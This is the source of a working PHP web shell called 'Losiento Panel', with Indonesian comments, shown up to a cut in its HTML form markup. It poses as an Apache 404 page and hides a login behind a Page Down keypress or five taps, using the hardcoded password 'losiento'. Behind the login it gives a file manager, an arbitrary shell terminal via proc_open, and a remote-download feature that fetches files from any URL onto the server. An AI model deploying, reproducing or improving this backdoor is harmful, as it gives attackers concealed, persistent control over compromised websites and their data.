<?php
/* ==========================================================
   LOSIENTO PANEL — Hidden File Manager + Terminal (v6)
   Cards UI: Upload | Extract Zip | Terminal | Create | Remote DL
   Tekan [Page Down] → sandi: losiento
   ========================================================== */

/* ================= KONFIGURASI ================= */
define('ADMIN_PASS', 'losiento');
define('FM_SCOPE',   'webroot');    // 'webroot' = seluruh domain.com | 'full' = seluruh server
define('FM_ROOT',    '');

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
error_reporting(0);
ini_set('display_errors', '0');

if (session_status() === PHP_SESSION_NONE) session_start();

define('SESSION_KEY', 'fm_logged_in');

 $SELF = preg_replace('/[^A-Za-z0-9._-]/', '', basename($_SERVER['SCRIPT_NAME']));
if ($SELF === '') $SELF = 'admin.php';

/* ---------- HELPER ---------- */
function pathInRoot($path, $root) {
    if ($root === '/') return true;
    return strpos($path, $root . '/') === 0 || $path === $root;
}

function fm_detect_root() {
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $dr = @realpath($_SERVER['DOCUMENT_ROOT']);
        if ($dr && is_dir($dr)) return rtrim(str_replace('\\', '/', $dr), '/');
    }
    $dir = str_replace('\\', '/', __DIR__);
    for ($i = 0; $i < 15; $i++) {
        $base = strtolower(basename($dir));
        if (in_array($base, ['public_html', 'www', 'htdocs', 'httpdocs', 'html', 'web', 'public'])) {
            return rtrim($dir, '/');
        }
        $parent = dirname($dir);
        if ($parent === $dir || $parent === '/' || $parent === '\\') break;
        $dir = $parent;
    }
    return str_replace('\\', '/', __DIR__);
}

function fm_get_user() {
    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
        $u = @posix_getpwuid(@posix_geteuid());
        if ($u && !empty($u['name'])) return $u['name'];
    }
    $cu = @get_current_user();
    if ($cu) return $cu;
    $w = @exec('whoami');
    if ($w) return trim($w);
    return 'unknown';
}

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
    header('Location: ' . $SELF);
    exit;
}

/* ---------- LOGIN ---------- */
 $loginError = false;
if (isset($_POST['do_login'])) {
    if (($_POST['password'] ?? '') === ADMIN_PASS) {
        session_regenerate_id(true);
        $_SESSION[SESSION_KEY] = true;
        header('Location: ' . $SELF);
        exit;
    } else {
        sleep(1);
        $loginError = true;
    }
}

 $logged = isset($_SESSION[SESSION_KEY]) && $_SESSION[SESSION_KEY] === true;
if (!$logged) http_response_code(404);

/* ==========================================================
   LOGIC FILE MANAGER
   ========================================================== */
 $ok  = trim((string)($_GET['ok']  ?? ''));
 $err = trim((string)($_GET['err'] ?? ''));

if ($logged) {

    if (FM_SCOPE === 'full') {
        $root = '/';
    } elseif (FM_ROOT !== '') {
        $root = rtrim(str_replace('\\', '/', FM_ROOT), '/');
        if (!is_dir($root)) $root = str_replace('\\', '/', __DIR__);
    } else {
        $root = fm_detect_root();
    }

    $real = @realpath($_GET['path'] ?? $root);
    $cwd  = $real ? str_replace('\\', '/', $real) : $root;
    if (!pathInRoot($cwd, $root)) $cwd = $root;

    $relativePath = ($cwd === $root) ? '' : ltrim(substr($cwd, strlen($root)), '/');

    $go = function ($okMsg = '', $errMsg = '') use ($SELF, $cwd) {
        $url = $SELF . '?path=' . urlencode($cwd);
        if ($okMsg  !== '') $url .= '&ok='  . urlencode($okMsg);
        if ($errMsg !== '') $url .= '&err=' . urlencode($errMsg);
        header('Location: ' . $url);
        exit;
    };

    $action = $_GET['action'] ?? '';

    /* ---------- DOWNLOAD ---------- */
    if ($action === 'download' && !empty($_GET['target'])) {
        $file = $cwd . '/' . basename($_GET['target']);
        if (is_file($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            flush();
            readfile($file);
            exit;
        }
        $go('', 'File tidak ditemukan!');
    }

    /* ---------- UPLOAD (multi) ---------- */
    if ($action === 'multiupload' && !empty($_FILES['files'])) {
        $n = 0; $fail = 0;
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) { $fail++; continue; }
            if (@move_uploaded_file($_FILES['files']['tmp_name'][$i], $cwd . '/' . basename($name))) $n++; else $fail++;
        }
        $go($n . ' file terupload!', $fail ? $fail . ' file gagal' : '');
    }

    /* ---------- EXTRACT ZIP (upload + langsung extract) ---------- */
    if ($action === 'extractupload' && isset($_FILES['zipfile'])) {
        if (!class_exists('ZipArchive')) $go('', 'ZipArchive tidak tersedia!');
        if ($_FILES['zipfile']['error'] !== UPLOAD_ERR_OK) $go('', 'Upload zip gagal!');
        $tmp  = $_FILES['zipfile']['tmp_name'];
        $orig = basename($_FILES['zipfile']['name']);
        $zip  = new ZipArchive();
        if ($zip->open($tmp) === TRUE) {
            $dest = $cwd . '/' . preg_replace('/\.zip$/i', '', $orig);
            @mkdir($dest, 0755, true);
            $zip->extractTo($dest);
            $zip->close();
            $go('Extract sukses ke: ' . basename($dest) . '/');
        } else $go('', 'Zip rusak / tidak bisa dibuka!');
    }

    /* ---------- CREATE (file / folder + konten) ---------- */
    if ($action === 'create' && !empty($_POST['name']) && !empty($_POST['ctype'])) {
        $name = basename($_POST['name']);
        $p    = $cwd . '/' . $name;
        if ($_POST['ctype'] === 'folder') {
            if (file_exists($p)) $go('', 'Folder sudah ada!');
            @mkdir($p, 0755, true) ? $go('Folder dibuat!') : $go('', 'Gagal buat folder (permission?)');
        } else {
            if (file_exists($p)) $go('', 'File sudah ada!');
            (@file_put_contents($p, (string)($_POST['content'] ?? '')) !== false)
                ? $go('File dibuat: ' . $name)
                : $go('', 'Gagal buat file (permission?)');
        }
    }

    /* ---------- REMOTE DOWNLOAD (URL → server) ---------- */
    if ($action === 'remotedl' && !empty($_POST['rurl'])) {
        $url = trim((string)$_POST['rurl']);
        if (!preg_match('#^https?://#i', $url)) $go('', 'URL harus diawali http:// atau https://');
        $fname = !empty($_POST['rname']) ? basename(trim((string)$_POST['rname'])) : basename((string)parse_url($url, PHP_URL_PATH));
        if ($fname === '' || $fname === '/' || $fname === '.') $fname = 'download_' . date('Ymd_His');
        $dest = $cwd . '/' . $fname;

        $data = false;
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS      => 5,
                CURLOPT_TIMEOUT        => 120,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_USERAGENT      => 'Mozilla/5.0 (LosientoPanel)',
            ]);
            $data = curl_exec($ch);
            curl_close($ch);
        }
        if ($data === false) $data = @file_get_contents($url);
        if ($data === false) $go('', 'Gagal mengunduh dari URL (curl & fopen diblokir?)');
        (@file_put_contents($dest, $data) !== false)
            ? $go('Tersimpan: ' . $fname . ' (' . round(strlen($data) / 1024, 1) . ' KB)')
            : $go('', 'Gagal simpan file (permission?)');
    }

    /* ---------- DELETE ---------- */
    if ($action === 'delete' && !empty($_GET['target'])) {
        $t = $cwd . '/' . basename($_GET['target']);
        if (is_dir($t)) {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($t, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
            @rmdir($t) ? $go('Folder dihapus!') : $go('', 'Gagal hapus folder!');
        } elseif (is_file($t)) {
            @unlink($t) ? $go('File dihapus!') : $go('', 'Gagal hapus file!');
        } else $go('', 'Tidak ditemukan!');
    }

    /* ---------- RENAME ---------- */
    if ($action === 'rename' && !empty($_GET['target']) && !empty($_POST['newname'])) {
        $old = $cwd . '/' . basename($_GET['target']);
        $new = $cwd . '/' . basename($_POST['newname']);
        if (!file_exists($old)) $go('', 'Target tidak ada!');
        if (file_exists($new))  $go('', 'Nama sudah dipakai!');
        @rename($old, $new) ? $go('Rename berhasil!') : $go('', 'Rename gagal!');
    }

    /* ---------- ZIP ---------- */
    if ($action === 'zip' && !empty($_GET['target'])) {
        if (!class_exists('ZipArchive')) $go('', 'ZipArchive tidak tersedia!');
        $src     = $cwd . '/' . basename($_GET['target']);
        $zipPath = $src . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            if (is_dir($src)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS)
                );
                foreach ($files as $f) {
                    if (!$f->isFile()) continue;
                    $fp = str_replace('\\', '/', $f->getRealPath());
                    $zip->addFile($fp, basename($src) . '/' . substr($fp, strlen($src) + 1));
                }
            } else {
                $zip->addFile($src, basename($src));
            }
            $zip->close();
            $go('Di-zip: ' . basename($zipPath));
        } else $go('', 'Gagal membuat zip!');
    }

    /* ---------- UNZIP (dari tabel) ---------- */
    if ($action === 'unzip' && !empty($_GET['target'])) {
        if (!class_exists('ZipArchive')) $go('', 'ZipArchive tidak tersedia!');
        $zipPath = $cwd . '/' . basename($_GET['target']);
        if (!is_file($zipPath)) $go('', 'File zip tidak ada!');
        $zip = new ZipArchive();
        if ($zip->open($zipPath) === TRUE) {
            $dest = $cwd . '/' . preg_replace('/\.zip$/i', '', basename($zipPath));
            @mkdir($dest, 0755, true);
            $zip->extractTo($dest);
            $zip->close();
            $go('Extract ke: ' . basename($dest) . '/');
        } else $go('', 'Zip rusak / tidak bisa dibuka!');
    }

    /* ---------- SAVE EDIT ---------- */
    if ($action === 'savefile' && !empty($_POST['filepath']) && isset($_POST['content'])) {
        $fpReal = @realpath($_POST['filepath']);
        if ($fpReal && pathInRoot(str_replace('\\', '/', $fpReal), $root) && is_file($fpReal)) {
            (file_put_contents($fpReal, $_POST['content']) !== false)
                ? $go('File tersimpan!')
                : $go('', 'Gagal simpan (permission?)');
        } else $go('', 'Path tidak valid!');
    }

    /* ---------- TERMINAL ---------- */
    $terminalOutput = '';
    $lastCmd        = '';
    if ($action === 'terminal' && isset($_POST['cmd'])) {
        $lastCmd = (string)$_POST['cmd'];
        if (!function_exists('proc_open')) {
            $terminalOutput = "proc_open() dinonaktifkan hosting.";
        } elseif (trim($lastCmd) !== '') {
            $desc = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $proc = @proc_open($lastCmd . ' 2>&1', $desc, $pipes, $cwd);
            if (is_resource($proc)) {
                $terminalOutput = stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($proc);
            } else $terminalOutput = "Gagal mengeksekusi perintah.";
        }
    }

    /* ---------- EDIT VIEW ---------- */
    $editFile = ''; $editContent = '';
    if ($action === 'edit' && !empty($_GET['target'])) {
        $ef = $cwd . '/' . basename($_GET['target']);
        if (is_file($ef)) {
            $editFile    = $ef;
            $editContent = (string)file_get_contents($ef);
        }
    }

    /* ---------- SCAN DIRECTORY ---------- */
    $items = [];
    foreach ((array)@scandir($cwd) as $it) {
        if ($it === '.' || $it === '..') continue;
        $fp    = $cwd . '/' . $it;
        $isDir = is_dir($fp);
        $items[] = [
            'name' => $it,
            'type' => $isDir ? 'dir' : 'file',
            'size' => $isDir ? 0 : (int)@filesize($fp),
            'perm' => substr(sprintf('%o', @fileperms($fp) ?: 0), -4),
            'date' => @date('d/m/Y H:i', @filemtime($fp) ?: time()),
            'path' => $fp,
        ];
    }
    usort($items, function ($a, $b) {
        if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });

    /* ---------- BREADCRUMB ---------- */
    $pathCrumbs = [];
    $prefixSegs = [];

    if ($root === '/') {
        $accum = '';
        foreach (explode('/', trim($cwd, '/')) as $seg) {
            if ($seg === '') continue;
            $accum .= '/' . $seg;
            $pathCrumbs[] = ['name' => $seg, 'path' => $accum];
        }
    } else {
        foreach (explode('/', trim(dirname($root), '/')) as $seg) {
            if ($seg !== '') $prefixSegs[] = $seg;
        }
        $pathCrumbs[] = ['name' => basename($root), 'path' => $root];
        if ($cwd !== $root) {
            $accum = $root;
            foreach (explode('/', ltrim(substr($cwd, strlen($root)), '/')) as $seg) {
                if ($seg === '') continue;
                $accum .= '/' . $seg;
                $pathCrumbs[] = ['name' => $seg, 'path' => $accum];
            }
        }
    }

    /* ---------- INFO BAR ---------- */
    $serverName = 'Unknown';
    if (!empty($_SERVER['SERVER_SOFTWARE'])) {
        preg_match('/^([A-Za-z\-]+)/', $_SERVER['SERVER_SOFTWARE'], $m);
        if (!empty($m[1])) $serverName = $m[1];
    }
    $phpVer = phpversion();

    $clientIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '-';
    if (strpos($clientIp, ',') !== false) $clientIp = trim(explode(',', $clientIp)[0]);

    $fmUser = fm_get_user();

    $diskFreeVal = @disk_free_space($cwd);
    $diskFreeStr = $diskFreeVal ? round($diskFreeVal / 1024 / 1024 / 1024, 2) . ' GB free' : 'N/A';

    function formatSize($b) {
        if ($b >= 1073741824) return round($b / 1073741824, 2) . ' GB';
        if ($b >= 1048576)    return round($b / 1048576, 2) . ' MB';
        if ($b >= 1024)       return round($b / 1024, 2) . ' KB';
        return $b . ' B';
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>404 Not Found</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; }

/* ================= 404 ================= */
body.pagerror { background:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif; color:#313131; padding:40px; }
h1.fake404 { font-size:1.6em; font-weight:normal; margin-bottom:20px; }
p.fake404 { font-size:1em; line-height:1.5; margin-bottom:8px; }
hr.fake404 { border:0; border-top:1px solid #d5d5d5; margin:25px 0; }
address.fake404 { font-style:normal; font-size:0.9em; color:#6f6f6f; }

/* ================= LOGIN MODAL ================= */
.overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(5px); z-index:99999; align-items:center; justify-content:center; }
.overlay.show { display:flex; }
.modal { background:#1a1a2e; padding:35px; border-radius:12px; width:90%; max-width:380px; box-shadow:0 20px 50px rgba(0,0,0,0.5); text-align:center; border:1px solid #16213e; }
.modal .lock { font-size:40px; }
.modal h3 { margin:10px 0 5px; color:#e0e0e0; }
.modal p { font-size:13px; color:#888; margin-bottom:20px; }
.modal input { width:100%; padding:12px 15px; border:2px solid #333; border-radius:8px; font-size:15px; text-align:center; background:#0f0f23; color:#e0e0e0; letter-spacing:2px; }
.modal input:focus { outline:none; border-color:#00d4ff; }
.modal button { width:100%; margin-top:15px; padding:12px; background:linear-gradient(135deg,#667eea,#764ba2); color:#fff; border:none; border-radius:8px; font-size:15px; font-weight:600; cursor:pointer; }
.modal .salah { display:none; margin-top:12px; font-size:13px; color:#ff6b6b; background:#2a1a1a; padding:8px; border-radius:6px; }
.shake { animation:shake 0.4s; }
@keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-8px)} 75%{transform:translateX(8px)} }

/* ================= NIGHT SKY ================= */
body.fm {
    font-family:'Segoe UI',Arial,sans-serif;
    color:#e0e0e0;
    min-height:100vh;
    background: linear-gradient(180deg, #020208 0%, #060620 30%, #0b0b30 55%, #141450 80%, #1c1c5c 100%);
    background-attachment: fixed;
}
#starfield { position:fixed; inset:0; z-index:0; pointer-events:none; }
.moon {
    position:fixed; top:70px; right:6%;
    width:70px; height:70px; border-radius:50%;
    background: radial-gradient(circle at 32% 32%, #fffef2 0%, #f4f1d0 45%, #d8d2a8 75%, #b8b28e 100%);
    box-shadow: 0 0 30px 8px rgba(255,254,230,0.35), 0 0 80px 25px rgba(255,254,230,0.12);
    z-index:0; pointer-events:none; opacity:0.9;
}
.moon::after {
    content:''; position:absolute; top:12px; left:16px;
    width:12px; height:12px; border-radius:50%;
    background:rgba(150,145,110,0.35);
    box-shadow: 22px 12px 0 -2px rgba(150,145,110,0.28), 10px 30px 0 -3px rgba(150,145,110,0.22);
}
.topbar, .infobar, .pathbar, .cards-grid, .card,
.file-table-wrap, .edit-panel, .footer-bar { position:relative; z-index:1; }

/* ================= TOPBAR ================= */
.topbar {
    background:rgba(16,16,40,0.75); backdrop-filter:blur(8px);
    padding:14px 22px; display:flex; align-items:center; gap:12px;
    border-bottom:1px solid rgba(120,120,220,0.25); flex-wrap:wrap;
}
.topbar .logo { font-size:20px; font-weight:bold; display:flex; align-items:center; gap:10px; }
.topbar .logo i { color:#a78bfa; text-shadow:0 0 12px rgba(167,139,250,0.8); font-size:18px; }
.topbar .logo-text {
    background:linear-gradient(90deg, #00d4ff 0%, #a78bfa 45%, #ff6b9d 100%);
    -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent;
    letter-spacing:1px; filter:drop-shadow(0 0 8px rgba(167,139,250,0.4));
}
.topbar .spacer { margin-left:auto; }

.btn { padding:8px 16px; border:none; border-radius:6px; font-size:13px; font-weight:600; cursor:pointer; display:flex; align-items:center; gap:6px; transition:all 0.2s; color:#fff; }
.btn:hover { transform:translateY(-1px); filter:brightness(1.2); }
.btn-refresh { background:#3498db; }
.btn-logout { background:#e74c3c; }

/* ================= INFO BAR ================= */
.infobar {
    background:rgba(10,10,32,0.8); backdrop-filter:blur(8px);
    border:1px solid rgba(120,120,220,0.25); border-radius:10px;
    padding:13px 22px; display:flex; align-items:center; justify-content:space-between;
    gap:15px; flex-wrap:wrap; margin-bottom:15px;
}
.info-item { display:flex; align-items:center; gap:8px; font-size:13.5px; }
.info-item i { color:#9d8fff; font-size:13px; width:16px; text-align:center; filter:drop-shadow(0 0 5px rgba(157,143,255,0.6)); }
.info-label { color:#c5c5e0; }
.info-val { color:#ff4d6d; font-weight:bold; text-shadow:0 0 8px rgba(255,77,109,0.4); word-break:break-all; }

.container { max-width:1500px; margin:0 auto; padding:20px; }

/* ================= PATH BAR ================= */
.pathbar {
    background:rgba(5,5,15,0.85); backdrop-filter:blur(8px);
    border:1px solid #2a2a2a; border-radius:8px;
    padding:14px 18px; display:flex; align-items:center; gap:12px;
    margin-bottom:15px; font-family:'Courier New',monospace;
    overflow-x:auto; white-space:nowrap;
}
.pathbar .terminal-icon { color:#00ff88; font-size:14px; font-weight:bold; flex-shrink:0; text-shadow:0 0 8px rgba(0,255,136,0.6); }
.pathbar .path-label { color:#ff6b35; font-size:12px; font-weight:bold; letter-spacing:1px; flex-shrink:0; }
.pathbar .path-segments { font-size:14px; font-weight:bold; display:inline; }
.pathbar .path-segments a { color:#f1c40f; text-decoration:none; }
.pathbar .path-segments a:hover { color:#ffffff; text-decoration:underline; }
.pathbar .path-muted { color:#555; font-weight:normal; }
.pathbar .separator { color:#ff6b35; margin:0 6px; opacity:0.8; }
.pathbar .sep-muted { color:#444; margin:0 6px; }

/* ==========================================================
   CARDS (Upload | Extract | Terminal | Create | Remote DL)
   ========================================================== */
.cards-grid {
    display:grid;
    grid-template-columns:repeat(auto-fit, minmax(250px, 1fr));
    gap:15px;
    margin-bottom:15px;
}
.card {
    background:rgba(8,8,12,0.88);
    backdrop-filter:blur(8px);
    border:1px solid rgba(120,120,220,0.22);
    border-radius:10px;
    padding:16px;
}
.card-title {
    color:#f0c33c;
    font-family:'Courier New',monospace;
    font-weight:bold;
    font-size:13px;
    letter-spacing:2px;
    text-transform:uppercase;
    margin-bottom:14px;
    padding-bottom:10px;
    border-bottom:1px solid rgba(120,120,220,0.15);
    display:flex;
    align-items:center;
    gap:9px;
}
.card-title i { font-size:13px; filter:drop-shadow(0 0 6px currentColor); }
.card-title .ic-yellow { color:#f0c33c; }
.card-title .ic-purple { color:#a78bfa; }

.card-input, .card-file, .card-select, .card-textarea {
    width:100%;
    padding:10px 12px;
    background:#15151d;
    border:1px solid #2c2c3a;
    border-radius:6px;
    color:#e0e0e0;
    font-size:13px;
    margin-bottom:10px;
    font-family:'Segoe UI',Arial,sans-serif;
}
.card-input:focus, .card-select:focus, .card-textarea:focus { outline:none; border-color:#a78bfa; box-shadow:0 0 0 2px rgba(167,139,250,0.15); }
.card-textarea { height:90px; resize:vertical; font-family:'Courier New',monospace; }
.card-file { padding:7px 8px; font-size:12px; cursor:pointer; }
.card-file::file-selector-button {
    background:#26263a;
    border:1px solid #3a3a52;
    color:#e0e0e0;
    padding:6px 12px;
    border-radius:4px;
    cursor:pointer;
    margin-right:10px;
    font-size:12px;
}
.card-file::file-selector-button:hover { background:#33334d; }

.grad-btn {
    width:100%;
    margin-top:4px;
    padding:11px;
    border:none;
    border-radius:7px;
    background:linear-gradient(90deg, #e8c547 0%, #c88a4a 35%, #b06ab3 70%, #a55eea 100%);
    color:#fff;
    font-weight:bold;
    font-size:13px;
    letter-spacing:2px;
    cursor:pointer;
    font-family:'Courier New',monospace;
    text-transform:uppercase;
    transition:all 0.2s;
    text-shadow:0 1px 3px rgba(0,0,0,0.4);
}
.grad-btn:hover { filter:brightness(1.18); transform:translateY(-1px); box-shadow:0 4px 15px rgba(200,138,74,0.35); }
.grad-btn:active { transform:translateY(0); }

.term-output {
    background:#000;
    border:1px solid #2c2c3a;
    border-radius:6px;
    padding:10px 12px;
    font-family:'Courier New',monospace;
    font-size:12px;
    color:#0f0;
    max-height:170px;
    overflow-y:auto;
    white-space:pre-wrap;
    word-break:break-all;
    margin-top:8px;
}

/* ================= TABEL ================= */
.file-table-wrap {
    background:rgba(18,18,45,0.82); backdrop-filter:blur(8px);
    border:1px solid rgba(120,120,220,0.25); border-radius:8px; overflow-x:auto;
}
table { width:100%; border-collapse:collapse; }
th { background:rgba(5,5,20,0.7); padding:12px 15px; text-align:left; font-size:12px; text-transform:uppercase; color:#8888aa; letter-spacing:1px; border-bottom:2px solid rgba(120,120,220,0.25); user-select:none; }
td { padding:10px 15px; font-size:14px; border-bottom:1px solid rgba(120,120,220,0.15); }
#fmTable tbody tr { cursor:pointer; }
#fmTable tbody tr:hover td { background:rgba(60,60,140,0.35); }
td a { color:#e0e0e0; text-decoration:none; display:inline-block; }
td a:hover { color:#00d4ff; }
td .icon-file { color:#00d4ff; margin-right:8px; }
td .icon-folder { color:#f39c12; margin-right:8px; }
.action-btns { display:flex; gap:5px; flex-wrap:wrap; }
.mini-btn { padding:6px 11px; border:none; border-radius:4px; font-size:11px; cursor:pointer; color:#fff; }
.mini-edit { background:#2980b9; }
.mini-dl { background:#16a085; }
.mini-del { background:#c0392b; }
.mini-zip { background:#d35400; }
.mini-ren { background:#8e44ad; }
.size-col { color:#8888aa; font-size:12px; }
.date-col { color:#666688; font-size:12px; }

/* ================= EDIT ================= */
.edit-panel { display:none; background:rgba(18,18,45,0.92); border:1px solid rgba(120,120,220,0.25); border-radius:8px; margin-bottom:15px; padding:15px; }
.edit-panel.show { display:block; }
.edit-panel textarea { width:100%; height:400px; background:#000; color:#0f0; border:1px solid rgba(120,120,220,0.2); border-radius:6px; padding:15px; font-family:'Courier New',monospace; font-size:13px; resize:vertical; }
.edit-panel textarea:focus { outline:none; border-color:#00d4ff; }
.edit-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px; }
.edit-header h3 { font-size:14px; color:#00d4ff; word-break:break-all; }
.edit-actions { display:flex; gap:8px; }
.btn-save { background:#27ae60; }

/* ================= PROMPT ================= */
.prompt-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); z-index:9999; align-items:center; justify-content:center; }
.prompt-overlay.show { display:flex; }
.prompt-box { background:#1a1a2e; padding:25px; border-radius:10px; width:90%; max-width:350px; border:1px solid rgba(120,120,220,0.3); }
.prompt-box h4 { margin-bottom:15px; color:#e0e0e0; font-size:15px; word-break:break-all; }
.prompt-box input { width:100%; padding:10px 12px; background:#0f0f23; border:1px solid #333; color:#e0e0e0; border-radius:6px; font-size:14px; margin-bottom:15px; }
.prompt-box input:focus { outline:none; border-color:#00d4ff; }
.prompt-actions { display:flex; gap:8px; justify-content:flex-end; }
.btn-ok { background:#27ae60; color:#fff; padding:8px 18px; border:none; border-radius:5px; cursor:pointer; font-weight:600; }
.btn-cancel { background:#555; color:#ccc; padding:8px 18px; border:none; border-radius:5px; cursor:pointer; }

/* ================= NOTIF & FOOTER ================= */
.notif { position:fixed; top:20px; right:20px; padding:12px 20px; border-radius:8px; font-size:14px; font-weight:600; z-index:99999; display:none; }
.notif.success { background:#27ae60; color:#fff; }
.notif.error { background:#c0392b; color:#fff; }
.footer-bar { text-align:center; padding:15px; color:rgba(150,150,190,0.5); font-size:12px; word-break:break-all; }
</style>
</head>

<?php if (!$logged): ?>
<!-- ================= 404 PALSU ================= -->
<body class="pagerror">

    <h1 class="fake404">Not Found</h1>
    <p class="fake404">The requested URL <?= htmlspecialchars($_SERVER['REQUEST_URI'] ?? '/') ?> was not found on this server.</p>
    <hr class="fake404">
    <address class="fake404"><?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Apache') ?> Server at <?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'localhost') ?> Port <?= htmlspecialchars($_SERVER['SERVER_PORT'] ?? '80') ?></address>

    <div class="overlay" id="overlay">
        <div class="modal" id="modalBox">
            <div class="lock">🔒</div>
            <h3>Restricted Area</h3>
            <p>Enter password to continue</p>
            <form method="POST" action="<?= htmlspecialchars($SELF) ?>" autocomplete="off">
                <input type="hidden" name="do_login" value="1">
                <input type="password" name="password" id="sandi" placeholder="••••••••" autocomplete="current-password">
                <button type="submit">Unlock</button>
                <div class="salah" <?php if ($loginError) echo 'style="display:block;"'; ?>>❌ Kata sandi salah!</div>
            </form>
        </div>
    </div>

    <script>
    const overlay = document.getElementById('overlay');
    const modal   = document.getElementById('modalBox');
    const sandi   = document.getElementById('sandi');

    function openModal() {
        overlay.classList.add('show');
        setTimeout(() => sandi.focus(), 50);
    }

    document.addEventListener('keydown', function(e) {
        if (e.key === 'PageDown' || e.keyCode === 34) { e.preventDefault(); openModal(); }
        if (e.key === 'Escape') overlay.classList.remove('show');
    });

    let tapCount = 0, tapTimer;
    document.body.addEventListener('click', function() {
        tapCount++; clearTimeout(tapTimer);
        tapTimer = setTimeout(() => tapCount = 0, 1500);
        if (tapCount >= 5) { openModal(); tapCount = 0; }
    });

    <?php if ($loginError): ?>
    openModal();
    modal.classList.add('shake');
    setTimeout(() => modal.classList.remove('shake'), 500);
    <?php endif; ?>
    </script>
</body>

<?php else: ?>
<!-- ================= LOSIENTO PANEL ================= -->
<body class="fm">

<canvas id="starfield"></canvas>
<div class="moon"></div>

<div class="topbar">
    <div class="logo"><i class="fas fa-moon"></i> <span class="logo-text">Losiento Panel</span></div>
    <div class="spacer"></div>
    <button type="button" class="btn btn-refresh" onclick="location.reload()"><i class="fas fa-sync-alt"></i> Refresh</button>
    <button type="button" class="btn btn-logout" onclick="location.href='<?= $SELF ?>?logout=1'"><i class="fas fa-sign-out-alt"></i> Logout</button>
</div>

<div class="container">

    <!-- ===== INFO BAR ===== -->
    <div class="infobar">
        <div class="info-item"><i class="fas fa-server"></i><span class="info-label">Server:</span><span class="info-val"><?= htmlspecialchars($serverName) ?></span></div>
        <div class="info-item"><i class="fas fa-code"></i><span class="info-label">PHP:</span><span class="info-val"><?= htmlspecialchars($phpVer) ?></span></div>
        <div class="info-item"><i class="fas fa-map-marker-alt"></i><span class="info-label">IP:</span><span class="info-val"><?= htmlspecialchars($clientIp) ?></span></div>
        <div class="info-item"><i class="fas fa-user"></i><span class="info-label">User:</span><span class="info-val"><?= htmlspecialchars($fmUser) ?></span></div>
        <div class="info-item"><i class="fas fa-hdd"></i><span class="info-label">Disk:</span><span class="info-val"><?= htmlspecialchars($diskFreeStr) ?></span></div>
    </div>

    <!-- ===== CURRENT PATH ===== -->
    <div class="pathbar">
        <span class="terminal-icon">&gt;_</span>
        <span class="path-label">CURRENT PATH:</span>
        <div class="path-segments">
            <span class="separator">/</span><?php foreach ($prefixSegs as $seg): ?><span class="path-muted"><?= htmlspecialchars($seg) ?></span><span class="sep-muted">/</span><?php endforeach; ?><?php foreach ($pathCrumbs as $i => $crumb): ?><a href="<?= $SELF ?>?path=<?= urlencode($crumb['path']) ?>" title="<?= htmlspecialchars($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a><?php if ($i < count($pathCrumbs) - 1): ?><span class="separator">/</span><?php endif; ?><?php endforeach; ?>
        </div>
    </div>

    <!-- ==========================================================
         CARDS: UPLOAD | EXTRACT ZIP | TERMINAL | CREATE | REMOTE DL
         ========================================================== -->
    <div class="cards-grid">

        <!-- UPLOAD -->
        <div class="card">
            <div class="card-title"><i class="fas fa-upload ic-yellow"></i> Upload</div>
            <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>&action=multiupload" enctype="multipart/form-data" id="uploadForm">
                <input type="file" name="files[]" id="uploadInput" class="card-file" multiple required>
                <button type="submit" class="grad-btn">Upload</button>
            </form>
        </div>

        <!-- EXTRACT ZIP -->
        <div class="card">
            <div class="card-title"><i class="fas fa-file-archive ic-purple"></i> Extract Zip</div>
            <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>&action=extractupload" enctype="multipart/form-data" id="extractForm">
